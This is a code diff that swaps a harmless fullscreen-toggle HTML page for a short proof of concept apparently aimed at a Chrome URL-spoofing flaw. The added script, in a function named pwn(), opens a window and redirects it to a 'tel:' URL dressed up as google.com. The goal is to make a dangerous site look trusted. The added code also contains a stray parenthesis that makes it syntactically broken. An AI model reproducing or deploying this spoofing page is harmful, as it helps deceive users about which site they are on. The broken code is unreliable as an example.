@@ -1,49 +1,13 @@
-<!DOCTYPE html>
-<html lang="id">
+<html>
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Fullscreen Toggle</title>
-  <style>
-    body {
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      margin: 0;
-      background-color: black;
-    }
-
-    button {
-      font-size: 20px;
-      padding: 10px 20px;
-      cursor: pointer;
-      color: white;
-      background-color: transparent;
-      border: none;
-      width: 100vw;
-      height: 100vh;
-      position: absolute;
-      top: 0;
-      left: 0;
-    }
-  </style>
+    <title>Chrome Url Spoofing (bypass dangerous website) vulnerability</title>
 </head>
-<body>
-  <button id="fullscreenBtn"></button>
-
-  <script>
-    const fullscreenBtn = document.getElementById('fullscreenBtn');
-    
-    fullscreenBtn.addEventListener('click', () => {
-      if (!document.fullscreenElement) {
-        document.documentElement.requestFullscreen();
-      } else {
-        if (document.exitFullscreen) {
-          document.exitFullscreen();
-        }
-      }
-    });
-  </script>
-</body>
+<script>
+function pwn() {
+    w = window.open();
+    w.document.write('<p>Calling Google</p>'));
+    setTimeout("w.location.replace('tel:https://google.com');",5);
+}
+</script>
+<h1><button href="#" onclick="pwn()">CLICK TO CALL</button></h1>
 </html>
